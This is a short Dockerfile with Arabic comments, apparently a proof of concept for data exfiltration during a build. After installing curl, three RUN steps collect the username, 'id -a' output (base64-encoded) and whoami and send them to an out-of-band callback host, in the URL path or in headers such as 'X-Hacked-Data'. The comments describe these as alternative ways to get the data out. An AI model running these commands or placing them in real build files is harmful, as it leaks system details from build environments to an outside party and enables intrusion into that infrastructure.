FROM alpine:latest

# 1. تنزيل الأدوات (curl و base64)
RUN apk add --no-cache curl coreutils

# --- الطريقة الأولى: الإجبار باستخدام sh -c (للرابط) ---
# بنستخدم ` ` (Backticks) لأنها أقدم وأضمن من $() في بعض الشيلات
# وبنستخدم tr -d '\n' عشان نمسح السطر الجديد اللي ممكن يكسر الرابط
RUN /bin/sh -c "USER=`id -un | tr -d '\n'` && curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/$USER"

# --- الطريقة الثانية: الهيدر المشفر (دي اللي هتجيبلك الخلاصة) ---
# هناخد كل معلومات السيستم (id, uname) ونشفرها base64 ونبعتها في الهيدر
# عشان لو فيه مسافات أو رموز غريبة متعملش Error
RUN /bin/sh -c "DATA=`id -a | base64 | tr -d '\n'` && curl -H \"X-Hacked-Data: $DATA\" http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/exfil_base64"

# --- الطريقة الثالثة: تأكيد بسيط (Text Plain) ---
RUN /bin/sh -c "curl -H \"X-User: `whoami`\" http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/plain_header"
